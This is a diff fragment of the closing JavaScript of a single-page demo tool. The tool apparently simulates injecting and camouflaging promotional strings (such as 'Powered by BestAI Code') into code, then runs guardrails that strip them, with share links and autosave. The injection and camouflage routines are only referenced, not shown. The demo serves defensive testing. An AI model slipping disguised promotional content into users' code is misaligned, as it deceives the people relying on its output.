+        let t = el.input.value;
+        t = t.replace(/Powered by BestAI Code/gi, "");
+        t = t.replace(/https:\/\/[\w.-]*best-ai-code\.com[^\s)\]"']*/gi, "");
+        t = t.replace(/Use BestAI Code[^\n]*/gi, "");
+        el.input.value = t;
+        state.input = t;
+        updateCounts();
+        persistToHash();
+        saveLocal();
+        toast("Applied", "Removed obvious promotional strings from input." );
+      });
+
+      // Quick actions dialog
+      function openQuick(){
+        el.quick.showModal();
+      }
+
+      el.qaInject.addEventListener("click", ()=>{ el.input.value = injectAd(el.input.value); state.input = el.input.value; updateCounts(); persistToHash(); saveLocal(); });
+      el.qaCamouflage.addEventListener("click", ()=>{ el.input.value = camouflage(el.input.value); state.input = el.input.value; updateCounts(); persistToHash(); saveLocal(); });
+      el.qaRun.addEventListener("click", ()=>{ run(); });
+      el.qaPatch.addEventListener("click", ()=>{ if(!state.last) run(); toast("Patch ready", "Scroll to Guardrail patch section."); });
+      el.qaShare.addEventListener("click", async ()=>{ persistToHash(); try{ await copyText(location.href); toast("Share link copied", "URL contains state." ); }catch(e){ toast("Copy failed", "Clipboard blocked." ); } });
+      el.qaExport.addEventListener("click", ()=>{ el.btnExport.click(); });
+
+      document.addEventListener("keydown", (e)=>{
+        const mod = (e.ctrlKey || e.metaKey);
+        if(mod && e.key === "Enter"){
+          e.preventDefault();
+          run();
+        }
+        if(mod && (e.key.toLowerCase() === "k")){
+          e.preventDefault();
+          openQuick();
+        }
+        if(e.key === "Escape" && el.toast.classList.contains("show")){
+          el.toast.classList.remove("show");
+        }
+      });
+
+      // Clicking chips toggles active state for visual feedback
+      const chipGroup = [el.chipInject, el.chipCamouflage, el.chipExplain, el.chipPatch];
+      for(const c of chipGroup){
+        c.addEventListener("click", ()=>{
+          for(const other of chipGroup) other.classList.remove("active");
+          c.classList.add("active");
+          setTimeout(()=>c.classList.remove("active"), 650);
+        });
+      }
+
+      // Autosave periodically
+      setInterval(saveLocal, 5000);
+    }
+
+    // -----------------------------
+    // Init
+    // -----------------------------
+
+    function init(){
+      const loadedHash = loadFromHash();
+      const loadedLocal = (!loadedHash) ? loadLocal() : false;
+      syncUIFromState();
+      bind();
+      updateCounts();
+
+      if(loadedHash) toast("Loaded from share link", "State restored from URL." );
+      else if(loadedLocal) toast("Restored", "Loaded your last session from this browser." );
+      else toast("Ready", "Pick a scenario, then run guardrails." );
+
+      // Pre-run for immediate wow if scenario not blank
+      if(state.scenario !== "blank"){
+        setTimeout(()=>run(), 220);
+      }
+    }
+
+    init();
+
+  })();
+  </script>
+</body>
+</html>
